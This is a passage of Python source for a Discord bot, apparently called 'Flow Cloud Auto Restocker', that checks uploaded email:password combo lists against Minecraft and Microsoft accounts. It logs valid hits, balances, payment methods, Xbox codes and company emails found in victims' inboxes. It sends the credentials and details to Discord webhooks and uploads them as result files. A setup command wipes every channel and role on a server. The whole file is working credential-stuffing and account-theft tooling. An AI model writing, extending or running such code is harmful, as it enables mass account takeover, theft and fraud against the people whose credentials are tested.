                self.balance_accounts.append(f"{email}:{password} | Balance: {account_details['balance']}")
            if account_details.get('payment_methods') and account_details['payment_methods'] != 'None':
                self.paymentmethods_accounts.append(f"{email}:{password} | Methods: {account_details['payment_methods']}")
            
            # Create Hypixel capture with all stats
            if username != "N/A":
                hypixel_capture = f"{email}:{password} | {username} | Level: {hypixel_stats.get('level', 'N/A')} | Rank: {hypixel_stats.get('rank', 'N/A')} | First Login: {hypixel_stats.get('first_login', 'N/A')} | Last Login: {hypixel_stats.get('last_login', 'N/A')} | BW Stars: {hypixel_stats.get('bw_stars', 'N/A')} | Skyblock Coins: {skyblock_coins} | Ban Status: {ban_status}"
                self.hypixel_captures.append(hypixel_capture)
            
            # Check email inbox for company emails
            company_emails = self.check_inbox_for_companies_sync(email, password)
            if company_emails:
                companies_str = ', '.join(company_emails)
                self.company_email_accounts.append(f"{email}:{password} | {companies_str}")

            if can_change_name == "True":
                self.namechangeable_accounts.append(f"{email}:{password} | {username}")

            if capes and capes != "None":
                self.capes_accounts.append(f"{email}:{password} | {username} | Capes: {capes}")

            if entitlement == "xgpu":
                account_type = "Xbox Game Pass Ultimate"
            elif entitlement == "xgp":
                account_type = "Xbox Game Pass"
            elif entitlement == "normal":
                account_type = "Normal"
            elif entitlement == "minecraft_other":
                account_type = f"Minecraft Games ({mc_games_str})"
            else:
                account_type = "Unknown"

            capture_line = f"{email}:{password} | {username} | {account_type} | Hypixel Ban: {ban_status} | 🍩 DonutSMP Cash: {donutsmp_cash} | 🍩 DonutSMP Banned: {donutsmp_banned} | 🍩 DonutSMP Shards: {donutsmp_shards} | Current Username: {username} | NameChangeable: {can_change_name}"

            if str(ban_status).lower() == "false":
                self.unbanned_accounts.append(capture_line)
            else:
                self.banned_accounts.append(capture_line)

            if entitlement == "xgpu":
                self.xboxgamepassultimate.append(capture_line)
                print(f"\033[92mXbox Game Pass Ultimate | {capture_line}\033[0m")
            elif entitlement == "xgp":
                self.xboxgamepass.append(capture_line)
                print(f"\033[92mXbox Game Pass | {capture_line}\033[0m")
            elif entitlement == "normal":
                self.normal_accounts.append(f"{email}:{password}")
                print(f"\033[94mNormal | {capture_line}\033[0m")
            elif entitlement == "minecraft_other":
                print(f"\033[90mOther | {capture_line}\033[0m")

            if has_bedrock:
                self.bedrock_accounts.append(f"{email}:{password} | {username}")
            if has_legends:
                self.legends_accounts.append(f"{email}:{password} | {username}")
            if has_dungeons:
                self.dungeons_accounts.append(f"{email}:{password} | {username}")

            has_java_access = has_java or entitlement in ["xgpu", "xgp", "normal"]

            if has_java_access:
                self.valid.append({'email': email, 'password': password, 'username': username, 'type': entitlement, 'mc_games': mc_games_str, 'has_java': has_java, 'has_bedrock': has_bedrock, 'has_legends': has_legends, 'has_dungeons': has_dungeons})
                self.hits.append(capture_line)

                capture_entry = f"Email: {email}\nPassword: {password}\nName: {username}\nUUID: {uuid_val}\nCapes: {capes}\nAccount Type: {account_type}\nEmail Access: {email_access}\nHypixel Ban: {ban_status}"
                
                # Add Hypixel stats
                if hypixel_stats.get('level'):
                    capture_entry += f"\nHypixel Level: {hypixel_stats['level']}"
                if hypixel_stats.get('rank'):
                    capture_entry += f"\nHypixel Rank: {hypixel_stats['rank']}"
                if hypixel_stats.get('first_login'):
                    capture_entry += f"\nHypixel First Login: {hypixel_stats['first_login']}"
                if hypixel_stats.get('last_login'):
                    capture_entry += f"\nHypixel Last Login: {hypixel_stats['last_login']}"
                if hypixel_stats.get('bw_stars'):
                    capture_entry += f"\nBedwars Stars: {hypixel_stats['bw_stars']}"
                
                # Add game info
                if mc_games_str:
                    capture_entry += f"\nMinecraft Games: {mc_games_str}"
                
                capture_entry += f"\nOptifine Cape: {optifine_cape}"
                capture_entry += f"\nMinecraft Capes: {minecraft_capes}"
                capture_entry += f"\nLast Name Change: {last_name_change}"
                capture_entry += f"\nSkyblock Coins: {skyblock_coins}"
                capture_entry += f"\nCan Change Name: {can_change_name}"
                
                # Add new name if set
                if new_name_set:
                    capture_entry += f"\nNew Name Set: {new_name_set}"
                
                # Add DonutSMP stats
                capture_entry += f"\n🍩 DonutSMP Cash: {donutsmp_cash}\n🍩 DonutSMP Banned: {donutsmp_banned}\n🍩 DonutSMP Shards: {donutsmp_shards}"
                
                # Add capture details
                capture_entry += f"\nReward Points: {account_details.get('reward_points', 'N/A')}\nBalance: {account_details.get('balance', 'N/A')}\nPayment Methods: {account_details.get('payment_methods', 'None')}"
                
                # Add Xbox codes if any
                if valid_codes:
                    capture_entry += f"\nXbox Codes Found: {len(valid_codes)}\n" + "\n".join(valid_codes)
                
                capture_entry += "\n============================"
                self.capture_accounts.append(capture_entry)

                self.send_to_webhook_sync({
                    'email': email,
                    'password': password,
                    'username': username,
                    'new_name': new_name_set,
                    'uuid': uuid_val,
                    'banned': ban_status,
                    'capes': capes,
                    'type': account_type,
                    'can_change_name': can_change_name,
                    'email_access': email_access,
                    'optifine_cape': optifine_cape,
                    'hypixel_level': hypixel_stats.get('level', 'N/A'),
                    'hypixel_rank': hypixel_stats.get('rank', 'N/A'),
                    'hypixel_first_login': hypixel_stats.get('first_login', 'N/A'),
                    'hypixel_last_login': hypixel_stats.get('last_login', 'N/A'),
                    'bw_stars': hypixel_stats.get('bw_stars', 'N/A'),
                    'mc_games': mc_games_str,
                    'has_java': has_java,
                    'donutsmp_cash': donutsmp_cash,
                    'donutsmp_banned': donutsmp_banned,
                    'donutsmp_shards': donutsmp_shards,
                    'reward_points': account_details.get('reward_points', 'N/A'),
                    'balance': account_details.get('balance', 'N/A'),
                    'payment_methods': account_details.get('payment_methods', 'None'),
                    'minecraft_capes': minecraft_capes,
                    'skyblock_coins': skyblock_coins,
                    'last_name_change': last_name_change
                })

            self.checked += 1

        except Exception as e:
            self.errors += 1
            self.checked += 1

    def send_to_webhook_sync(self, account):
        try:
            email = account.get('email', 'N/A')
            password = account.get('password', 'N/A')
            username = account.get('username', 'N/A')
            new_name = account.get('new_name', None)
            banned = account.get('banned', 'Unknown')
            capes = account.get('capes', 'None')
            account_type = account.get('type', 'Normal')
            can_change_name = account.get('can_change_name', 'N/A')
            email_access = account.get('email_access', 'Unknown')
            optifine_cape = account.get('optifine_cape', 'Unknown')
            minecraft_capes = account.get('minecraft_capes', 'Unknown')
            skyblock_coins = account.get('skyblock_coins', 'Unknown')
            last_name_change = account.get('last_name_change', 'Unknown')
            hypixel_level = account.get('hypixel_level', 'N/A')
            bw_stars = account.get('bw_stars', 'N/A')
            mc_games = account.get('mc_games', '')
            donutsmp_cash = account.get('donutsmp_cash', 'N/A')
            donutsmp_banned = account.get('donutsmp_banned', 'Unknown')
            donutsmp_shards = account.get('donutsmp_shards', 'N/A')

            webhook_url = None
            
            if str(banned).lower() == "false":
                webhook_url = UNBANNED_WEBHOOK_URL
            else:
                webhook_url = BANNED_WEBHOOK_URL

            if not webhook_url or 'paste' in webhook_url.lower():
                return

            custom_image_url = "https://cdn.discordapp.com/attachments/1439671166007775312/1441536474578423838/IMG_5098.png"
            
            # Use new name as title if available, otherwise use original username
            embed_title = new_name if new_name else (username if username != "N/A" else email)

            fields = [
                {"name": "📧 Email", "value": f"||{email}||", "inline": True},
                {"name": "🔑 Password", "value": f"||{password}||", "inline": True},
                {"name": "⛔ Banned", "value": f"{banned}", "inline": True},
                {"name": "🎮 Hypixel Name", "value": username, "inline": True},
                {"name": "✨ New Name", "value": new_name if new_name else "Not Changed", "inline": True},
                {"name": "🔄 Can Change Name", "value": str(can_change_name), "inline": True},
                {"name": "📊 Hypixel Level", "value": str(hypixel_level), "inline": True},
                {"name": "🦸 Capes", "value": f"{capes} | Optifine: {optifine_cape}", "inline": True},
                {"name": "� MC Capes", "value": str(minecraft_capes), "inline": True},
                {"name": "⏰ Last Name Change", "value": str(last_name_change), "inline": True},
                {"name": "💰 Skyblock Coins", "value": str(skyblock_coins), "inline": True},
                {"name": "�🎯 Account Type", "value": account_type, "inline": True},
                {"name": "🛡️ Combo", "value": f"||{email}:{password}||", "inline": True},
                {"name": "🍩 DonutSMP Cash", "value": str(donutsmp_cash), "inline": True},
                {"name": "🍩 DonutSMP Banned", "value": str(donutsmp_banned), "inline": True},
                {"name": "🍩 DonutSMP Shards", "value": str(donutsmp_shards), "inline": True}
            ]

            payload = {
                "username": "Flow Cloud Restocker",
                "avatar_url": custom_image_url,
                "embeds": [{
                    "author": {
                        "name": "Flow Cloud Restocker",
                        "icon_url": custom_image_url
                    },
                    "title": embed_title,
                    "color": 0x00FFFF,
                    "fields": fields,
                    "thumbnail": {"url": f"https://visage.surgeplay.com/bust/{username}?y=-40&quality=lossless" if username != "N/A" else custom_image_url},
                    "footer": {"text": "Flow Cloud Auto Restocker | By SeriesV2", "icon_url": custom_image_url}
                }]
            }

            requests.post(webhook_url, json=payload, timeout=10, verify=False)
        except Exception as e:
            pass

    async def run_check(self):
        loop = asyncio.get_event_loop()
        batch_size = 2

        for i in range(0, len(self.combos), batch_size):
            if not self.running:
                break

            batch = self.combos[i:i + batch_size]
            tasks = [loop.run_in_executor(executor, self.check_single_account_sync, combo) for combo in batch if self.running]

            if tasks:
                await asyncio.gather(*tasks)

            await asyncio.sleep(0.05)

        if self.running:
            self.running = False
            await send_completion_summary(self)

            if self.user_id in checking_status:
                del checking_status[self.user_id]

async def send_completion_summary(session):
    try:
        if session.summary_sent:
            return

        session.summary_sent = True

        if not LOG_CHANNEL_ID:
            return

        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if not log_channel:
            return

        embed = discord.Embed(
            title="🏢 Current Checker Status",
            color=0x00FFFF
        )

        embed.add_field(name="📁 Total/Checked", value=f"{session.checked}/{session.total}", inline=False)
        embed.add_field(name="✅ Hits", value=str(len(session.hits)), inline=False)
        embed.add_field(name="❌ Bad", value=str(len(session.invalid)), inline=False)
        embed.add_field(name="🔒 MFA", value=str(len(session.mfa_accounts)), inline=False)
        embed.add_field(name="🔐 2FA", value=str(len(session.two_fa_accounts)), inline=False)
        embed.add_field(name="🔒 SFA", value=str(len(session.sfa_accounts)), inline=False)
        embed.add_field(name="🎮 Xbox Gamepass", value=str(len(session.xboxgamepass)), inline=False)
        embed.add_field(name="⭐ Xbox Gamepass Ultimate", value=str(len(session.xboxgamepassultimate)), inline=False)
        embed.add_field(name="🎲 Bedrock", value=str(len(session.bedrock_accounts)), inline=False)
        embed.add_field(name="⚔️ Legends", value=str(len(session.legends_accounts)), inline=False)
        embed.add_field(name="🏰 Dungeons", value=str(len(session.dungeons_accounts)), inline=False)
        embed.add_field(name="📩 Valid Mail", value=str(len(session.valid_mails)), inline=False)
        embed.add_field(name="🔄 Retries", value=str(session.retries), inline=False)
        embed.add_field(name="⚠️ Errors", value=str(session.errors), inline=False)
        embed.add_field(name="🎁 Xbox Codes Fetched", value=str(len(session.fetched_codes)), inline=False)
        embed.add_field(name="✅ Valid Xbox Codes", value=str(len(session.valid_fetchedcodes)), inline=False)
        embed.add_field(name="🎯 Hypixel Captures", value=str(len(session.hypixel_captures)), inline=False)
        embed.add_field(name="📧 Company Emails Found", value=str(len(session.company_email_accounts)), inline=False)
        embed.set_footer(text="Flow Cloud Auto Restocker | By SeriesV2")


        await log_channel.send(embed=embed)

        files_to_upload = [
            ("2FA.txt", session.two_fa_accounts),
            ("SFA.txt", session.sfa_accounts),
            ("MFA.txt", session.mfa_accounts),
            ("Normal.txt", session.normal_accounts),
            ("Bedrock.txt", session.bedrock_accounts),
            ("Legends.txt", session.legends_accounts),
            ("Dungeons.txt", session.dungeons_accounts),
            ("Capes.txt", session.capes_accounts),
            ("Capture.txt", session.capture_accounts),
            ("Hits.txt", session.hits),
            ("Unbanned.txt", session.unbanned_accounts),
            ("Banned.txt", session.banned_accounts),
            ("Xboxgamepass.txt", session.xboxgamepass),
            ("Xboxgamepassultimate.txt", session.xboxgamepassultimate),
            ("Validmail.txt", session.valid_mails),
            ("Namechangeable.txt", session.namechangeable_accounts),
            ("fetched_codes.txt", session.fetched_codes),
            ("valid_fetchedcodes.txt", session.valid_fetchedcodes),
            ("reward_points.txt", session.reward_points_accounts),
            ("balance.txt", session.balance_accounts),
            ("paymentmethods.txt", session.paymentmethods_accounts),
            ("hypixel_capture.txt", session.hypixel_captures),
            ("mails.txt", session.company_email_accounts),
        ]

        for filename, data_list in files_to_upload:
            if data_list:
                content = '\n'.join(data_list)
                file_bytes = BytesIO(content.encode('utf-8'))
                await log_channel.send(f"📤 Uploading result file: **{filename}**", file=discord.File(file_bytes, filename))

        await log_channel.send(embed=discord.Embed(title="Checker Complete", description="All results sent.", color=0x00FFFF))

    except Exception as e:
        pass

def update_config(key, value):
    config.read(config_file)
    config['SETTINGS'][key] = str(value)
    with open(config_file, 'w') as f:
        config.write(f)

@bot.event
async def on_ready():
    print(f'Bot logged in as {bot.user}')

@bot.event
async def on_member_join(member):
    try:
        unauthorized_role = discord.utils.get(member.guild.roles, name="Unauthorized Users")
        if unauthorized_role:
            await member.add_roles(unauthorized_role)
    except:
        pass

@bot.command()
async def check(ctx):
    authed_users = load_authed_users()
    if ctx.author.id not in authed_users:
        embed = discord.Embed(title="Not Authorized", description=f"{ctx.author.mention} You are not authorized.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    if not ctx.message.attachments:
        embed = discord.Embed(title="No Attachment", description="Please attach a .txt file with combo list", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith('.txt'):
        embed = discord.Embed(title="Invalid File Type", description="Please attach a .txt file", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    if checking_status:
        active_user_id = list(checking_status.keys())[0]
        active_user = bot.get_user(active_user_id)
        embed = discord.Embed(title="Check Already Running", description=f"A check is running by {active_user.mention if active_user else 'another user'}. Use $stop first.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    content = await attachment.read()
    combos = content.decode('utf-8').splitlines()

    session = CheckerSession(ctx.author.id, combos)
    checking_status[ctx.author.id] = session

    embed = discord.Embed(title="Check Started", description=f"Checking **{len(combos):,}** accounts...", color=0x00FFFF)
    await ctx.send(embed=embed)

    asyncio.create_task(session.run_check())

@bot.command()
async def cui(ctx):
    authed_users = load_authed_users()
    if ctx.author.id not in authed_users:
        embed = discord.Embed(
            title="❌ Not Authorized",
            description=f"{ctx.author.mention} You are not authorized to use this command.",
            color=0x00FFFF,
            timestamp=datetime.utcnow()
        )
        embed.set_footer(text="Flow Cloud ・ Authorization Required")
        await ctx.send(embed=embed)
        return

    if not checking_status:
        embed = discord.Embed(
            title="🏢 Current Checker Status",
            color=0x00FFFF
        )
        embed.add_field(name="📁 Total/Checked", value="0/0", inline=False)
        embed.add_field(name="✅ Hits", value="0", inline=False)
        embed.add_field(name="❌ Bad", value="0", inline=False)
        embed.add_field(name="🔒 MFA", value="0", inline=False)
        embed.add_field(name="🔐 2FA", value="0", inline=False)
        embed.add_field(name="🔒 SFA", value="0", inline=False)
        embed.add_field(name="🎮 Xbox Gamepass", value="0", inline=False)
        embed.add_field(name="⭐ Xbox Gamepass Ultimate", value="0", inline=False)
        embed.add_field(name="🎲 Bedrock", value="0", inline=False)
        embed.add_field(name="⚔️ Legends", value="0", inline=False)
        embed.add_field(name="🏰 Dungeons", value="0", inline=False)
        embed.add_field(name="📩 Valid Mail", value="0", inline=False)
        embed.add_field(name="🔄 Retries", value="0", inline=False)
        embed.add_field(name="⚠️ Errors", value="0", inline=False)
        embed.set_footer(text="Flow Cloud Auto Restocker | By SeriesV2")
        await ctx.send(embed=embed)
        return

    session = list(checking_status.values())[0]

    embed = discord.Embed(
        title="🏢 Current Checker Status",
        color=0x00FFFF
    )

    embed.add_field(name="📁 Total/Checked", value=f"{session.checked}/{session.total}", inline=False)
    embed.add_field(name="✅ Hits", value=str(len(session.hits)), inline=False)
    embed.add_field(name="❌ Bad", value=str(len(session.invalid)), inline=False)
    embed.add_field(name="🔒 MFA", value=str(len(session.mfa_accounts)), inline=False)
    embed.add_field(name="🔐 2FA", value=str(len(session.two_fa_accounts)), inline=False)
    embed.add_field(name="🔒 SFA", value=str(len(session.sfa_accounts)), inline=False)
    embed.add_field(name="🎮 Xbox Gamepass", value=str(len(session.xboxgamepass)), inline=False)
    embed.add_field(name="⭐ Xbox Gamepass Ultimate", value=str(len(session.xboxgamepassultimate)), inline=False)
    embed.add_field(name="🎲 Bedrock", value=str(len(session.bedrock_accounts)), inline=False)
    embed.add_field(name="⚔️ Legends", value=str(len(session.legends_accounts)), inline=False)
    embed.add_field(name="🏰 Dungeons", value=str(len(session.dungeons_accounts)), inline=False)
    embed.add_field(name="📩 Valid Mail", value=str(len(session.valid_mails)), inline=False)
    embed.add_field(name="🔄 Retries", value=str(session.retries), inline=False)
    embed.add_field(name="⚠️ Errors", value=str(session.errors), inline=False)

    embed.set_footer(text="Flow Cloud Auto Restocker | By SeriesV2")

    await ctx.send(embed=embed)

@bot.command()
async def stop(ctx):
    authed_users = load_authed_users()
    if ctx.author.id not in authed_users:
        embed = discord.Embed(title="Not Authorized", description=f"{ctx.author.mention} You are not authorized.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    if not checking_status:
        embed = discord.Embed(title="No Active Session", description="No active checking session found.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    session = list(checking_status.values())[0]
    session_user_id = list(checking_status.keys())[0]
    session.running = False

    await asyncio.sleep(1)
    await send_completion_summary(session)

    if session_user_id in checking_status:
        del checking_status[session_user_id]

    await ctx.send("Checker stopped and results sent!")

@bot.command()
async def setup(ctx):
    if ctx.author.id != ctx.guild.owner_id:
        await ctx.send("Only the server owner can use this command.")
        return

    setup_msg = await ctx.send("Setting up server structure...")

    try:
        try:
            await ctx.guild.edit(name="Flow Cloud Restockers")
        except:
            pass

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                pass

        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass

        await asyncio.sleep(2)

        owner_role = await ctx.guild.create_role(name="Owner", permissions=discord.Permissions.all(), color=discord.Color.red(), hoist=True)
        authorized_role = await ctx.guild.create_role(name="Authorized Users", permissions=discord.Permissions.none(), color=discord.Color.green(), hoist=True)
        unauthorized_role = await ctx.guild.create_role(name="Unauthorized Users", permissions=discord.Permissions.none(), color=discord.Color.greyple(), hoist=True)
        bot_role = await ctx.guild.create_role(name="Main Bot", permissions=discord.Permissions.all(), color=discord.Color.purple(), hoist=True)

        await ctx.guild.owner.add_roles(owner_role)

        try:
            bot_member = ctx.guild.get_member(bot.user.id)
            if bot_member:
                await bot_member.add_roles(bot_role)
        except:
            pass

        paid_checker_category = await ctx.guild.create_category("Flow Cloud Checker", overwrites={
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            unauthorized_role: discord.PermissionOverwrite(read_messages=False),
            authorized_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            owner_role: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        })

        general_category = await ctx.guild.create_category("General", overwrites={
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            unauthorized_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            authorized_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            owner_role: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        })

        general_chat = await general_category.create_text_channel("general-chat")

        hits_channel = await paid_checker_category.create_text_channel("hits")
        commands_channel = await paid_checker_category.create_text_channel("commands")
        banned_channel = await paid_checker_category.create_text_channel("banned")
        unbanned_channel = await paid_checker_category.create_text_channel("unbanned")

        update_config('log_channel_id', hits_channel.id)

        try:
            banned_webhook = await banned_channel.create_webhook(name="Banned Hits")
            update_config('BannedWebhook', banned_webhook.url)
        except:
            pass

        try:
            unbanned_webhook = await unbanned_channel.create_webhook(name="Unbanned Hits")
            update_config('UnbannedWebhook', unbanned_webhook.url)
        except:
            pass

        global BANNED_WEBHOOK_URL, UNBANNED_WEBHOOK_URL, LOG_CHANNEL_ID
        config.read(config_file)
        BANNED_WEBHOOK_URL = config['SETTINGS'].get('BannedWebhook', '')
        UNBANNED_WEBHOOK_URL = config['SETTINGS'].get('UnbannedWebhook', '')
        LOG_CHANNEL_ID = int(config['SETTINGS']['log_channel_id'])

        embed = discord.Embed(title="Setup Complete", description="Server structure created!", color=0x00FFFF)
        embed.add_field(name="Log Channel", value=hits_channel.mention, inline=False)
        embed.add_field(name="General Chat", value=general_chat.mention, inline=False)
        await commands_channel.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def auth(ctx, member: discord.Member = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if member is None:
        await ctx.send("Please mention a user to authorize.")
        return

    authed_users = load_authed_users()

    if member.id in authed_users:
        await ctx.send(f"{member.mention} is already authorized.")
        return

    authed_users.append(member.id)
    save_authed_users(authed_users)

    try:
        authorized_role = discord.utils.get(ctx.guild.roles, name="Authorized Users")
        unauthorized_role = discord.utils.get(ctx.guild.roles, name="Unauthorized Users")
        if authorized_role:
            await member.add_roles(authorized_role)
        if unauthorized_role and unauthorized_role in member.roles:
            await member.remove_roles(unauthorized_role)
    except:
        pass

    embed = discord.Embed(title="User Authorized", description=f"{member.mention} has been authorized.", color=0x00FFFF)
    await ctx.send(embed=embed)

@bot.command()
async def unauth(ctx, member: discord.Member = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if member is None:
        await ctx.send("Please mention a user to unauthorize.")
        return

    authed_users = load_authed_users()

    if member.id not in authed_users:
        await ctx.send(f"{member.mention} is not authorized.")
        return

    authed_users.remove(member.id)
    save_authed_users(authed_users)

    try:
        authorized_role = discord.utils.get(ctx.guild.roles, name="Authorized Users")
        unauthorized_role = discord.utils.get(ctx.guild.roles, name="Unauthorized Users")
        if authorized_role and authorized_role in member.roles:
            await member.remove_roles(authorized_role)
        if unauthorized_role:
            await member.add_roles(unauthorized_role)
    except:
        pass

    embed = discord.Embed(title="User Unauthorized", description=f"{member.mention} access removed.", color=0x00FFFF)
    await ctx.send(embed=embed)

@bot.command()
async def listauth(ctx):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    authed_users = load_authed_users()

    embed = discord.Embed(title="Authorized Users", color=0x00FFFF)

    if not authed_users:
        embed.description = "No authorized users."
    else:
        user_list = []
        for user_id in authed_users:
            user = bot.get_user(user_id)
            if user:
                user_list.append(f"{user.mention} - `{user_id}`")
            else:
                user_list.append(f"Unknown - `{user_id}`")
        embed.description = '\n'.join(user_list)

    embed.set_footer(text=f"Total: {len(authed_users)} users")
    await ctx.send(embed=embed)

@bot.command()
async def botstatus(ctx):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    uptime_seconds = time.time() - start_time
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)

    embed = discord.Embed(title="Bot Status", color=0x00FFFF)
    embed.add_field(name="Uptime", value=f"{hours:02d}:{minutes:02d}:{seconds:02d}", inline=True)
    embed.add_field(name="Python", value=f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}", inline=True)

    await ctx.send(embed=embed)

@bot.command()
async def botaccess(ctx, access_level: int = None, member: discord.Member = None, duration: str = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if not access_level or not member or not duration:
        embed = discord.Embed(
            title="❌ Missing Arguments",
            description="Usage: `$botaccess <1|2|3> @user <duration>`\n\n**Access Levels:**\n1️⃣ - Banned channel only\n2️⃣ - Banned + Unbanned channels\n3️⃣ - Banned + Unbanned + Hits channels\n\n**Duration:** 1s, 1m, 1h, 1w, 1mo, lifetime",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    if access_level not in [1, 2, 3]:
        embed = discord.Embed(
            title="❌ Invalid Access Level",
            description="Please use 1, 2, or 3 for access level.",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    duration_seconds = None
    if duration.lower() == "lifetime":
        duration_seconds = None
    else:
        import re
        match = re.match(r'^(\d+)(s|m|h|w|mo)$', duration.lower())
        if not match:
            embed = discord.Embed(
                title="❌ Invalid Duration",
                description="Valid formats: 1s, 1m, 1h, 1w, 1mo, lifetime",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
            return

        amount = int(match.group(1))
        unit = match.group(2)

        if unit == 's':
            duration_seconds = amount
        elif unit == 'm':
            duration_seconds = amount * 60
        elif unit == 'h':
            duration_seconds = amount * 3600
        elif unit == 'w':
            duration_seconds = amount * 604800
        elif unit == 'mo':
            duration_seconds = amount * 2592000

    try:
        banned_channel = discord.utils.get(ctx.guild.channels, name="banned")
        unbanned_channel = discord.utils.get(ctx.guild.channels, name="unbanned")
        hits_channel = discord.utils.get(ctx.guild.channels, name="hits")

        channels_to_grant = []

        if access_level >= 1 and banned_channel:
            channels_to_grant.append(banned_channel)

        if access_level >= 2 and unbanned_channel:
            channels_to_grant.append(unbanned_channel)

        if access_level >= 3:
            if hits_channel:
                channels_to_grant.append(hits_channel)

        for channel in channels_to_grant:
            await channel.set_permissions(member, read_messages=True, send_messages=True)

        channel_names = ", ".join([f"#{ch.name}" for ch in channels_to_grant])

        embed = discord.Embed(
            title="✅ Access Granted",
            description=f"{member.mention} has been granted access to: {channel_names}",
            color=0x00FF00
        )

        if duration_seconds:
            embed.add_field(name="Duration", value=duration, inline=False)
            await ctx.send(embed=embed)

            await asyncio.sleep(duration_seconds)

            for channel in channels_to_grant:
                await channel.set_permissions(member, overwrite=None)

            revoke_embed = discord.Embed(
                title="⏰ Access Expired",
                description=f"{member.mention}'s access to {channel_names} has expired.",
                color=0xFFA500
            )
            await ctx.send(embed=revoke_embed)
        else:
            embed.add_field(name="Duration", value="Lifetime", inline=False)
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to grant access: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def create(ctx, channel_type: str = None):
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("Only the bot owner can use this command.")
        return

    if not channel_type:
        embed = discord.Embed(
            title="❌ Missing Argument",
            description="Usage: `$create <banned|unbanned>`",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    channel_type = channel_type.lower()

    if channel_type not in ['banned', 'unbanned']:
        embed = discord.Embed(
            title="❌ Invalid Type",
            description="Please use: `banned` or `unbanned`",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        return

    try:
        paid_checker_category = discord.utils.get(ctx.guild.categories, name="Flow Cloud Checker")

        if not paid_checker_category:
            embed = discord.Embed(
                title="❌ Category Not Found",
                description="Please run `$setup` first to create the Flow Cloud Checker category.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
            return

        new_channel = await paid_checker_category.create_text_channel(channel_type)

        webhook = await new_channel.create_webhook(name="Flow Cloud Restocker")

        if channel_type == 'banned':
            update_config('BannedWebhook', webhook.url)
            global BANNED_WEBHOOK_URL
            BANNED_WEBHOOK_URL = webhook.url
        elif channel_type == 'unbanned':
            update_config('UnbannedWebhook', webhook.url)
            global UNBANNED_WEBHOOK_URL
            UNBANNED_WEBHOOK_URL = webhook.url

        embed = discord.Embed(
            title="✅ Channel and Webhook Created",
            description=f"Successfully created #{channel_type} channel and webhook.",
            color=0x00FF00
        )
        embed.add_field(name="Channel", value=new_channel.mention, inline=False)
        embed.add_field(name="Webhook", value=f"Flow Cloud Restocker", inline=False)
        embed.add_field(name="Config Updated", value=f"{channel_type.capitalize()}Webhook", inline=False)

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to create channel/webhook: {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

bot.run(BOT_TOKEN)
